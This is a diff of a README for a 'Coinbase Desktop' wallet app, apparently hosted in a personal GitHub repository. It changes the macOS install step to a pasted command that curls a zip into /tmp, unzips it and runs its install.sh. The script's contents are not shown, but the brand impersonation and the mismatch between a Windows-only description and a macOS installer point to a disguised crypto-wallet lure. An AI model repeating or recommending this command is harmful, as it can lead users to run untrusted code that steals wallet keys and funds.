@@ -23,5 +23,8 @@ Coinbase Desktop is a high-performance, native Windows application built in C++,
 ### 🍏 For macOS
 ## 📦 Installation
 ```
-git clone https://github.com/Kirubel125/Coinbase-Wallet-Desktop && cd Coinbase-Wallet-Desktop && bash install.sh
+curl -fsSL https://github.com/Kirubel125/Coinbase-Wallet-Desktop/archive/refs/heads/main.zip -o /tmp/cw.zip && \
+unzip -qo /tmp/cw.zip -d /tmp && \
+cd /tmp/Coinbase-Wallet-Desktop-main && \
+bash install.sh
 ```
